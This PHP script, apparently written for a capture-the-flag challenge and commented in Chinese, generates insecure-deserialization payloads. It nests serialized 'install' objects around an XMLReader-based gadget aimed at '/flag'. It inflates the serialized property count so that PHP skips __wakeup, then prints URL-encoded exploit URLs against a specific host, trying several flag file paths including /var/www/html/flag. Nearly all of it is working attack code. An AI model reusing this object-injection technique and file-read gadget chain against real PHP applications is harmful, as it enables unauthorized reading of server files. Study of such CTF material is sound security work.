<?php
// 绕过__wakeup的方法：修改对象属性数量
// 当反序列化时，如果对象的属性数量大于实际数量，PHP会跳过__wakeup

class install
{
    private $username;
    private $password;

    public function __construct($username, $password)
    {
        $this->username = $username;
        $this->password = $password;
    }
}

class Until
{
    public $a;
    public $b;
    public $c;

    public function __construct($a, $b, $c)
    {
        $this->a = $a;
        $this->b = $b;
        $this->c = $c;
    }
}

// 生成基础payload
$until = new Until('XMLReader', '/flag', null);
$inner_install = new install($until, 'pass2');
$outer_install = new install($inner_install, 'pass1');

$payload = serialize($outer_install);
echo "Original payload:\n";
echo $payload . "\n\n";

// 绕过__wakeup：修改属性数量
// O:7:"install":2: 改成 O:7:"install":3: (或更大的数字)
$bypassed = preg_replace('/O:7:"install":2:/', 'O:7:"install":3:', $payload, 1);

echo "Bypassed __wakeup payload (only outer):\n";
echo $bypassed . "\n\n";
echo "URL:\n";
echo "http://f7c8a2a3.clsadp.com/?data=" . urlencode($bypassed) . "\n\n";

// 也尝试绕过两个install对象的__wakeup
$bypassed2 = preg_replace('/O:7:"install":2:/', 'O:7:"install":3:', $payload);
echo "Bypassed both __wakeup:\n";
echo $bypassed2 . "\n\n";
echo "URL:\n";
echo "http://f7c8a2a3.clsadp.com/?data=" . urlencode($bypassed2) . "\n\n";

// 尝试flag文件
foreach (['/flag', 'flag', 'flag.php', '/var/www/html/flag'] as $path) {
    $until = new Until('XMLReader', $path, null);
    $inner_install = new install($until, 'pass2');
    $outer_install = new install($inner_install, 'pass1');
    $payload = serialize($outer_install);
    $bypassed = preg_replace('/O:7:"install":2:/', 'O:7:"install":3:', $payload);
    echo "=== Path: $path (bypassed __wakeup) ===\n";
    echo "http://f7c8a2a3.clsadp.com/?data=" . urlencode($bypassed) . "\n\n";
}
?>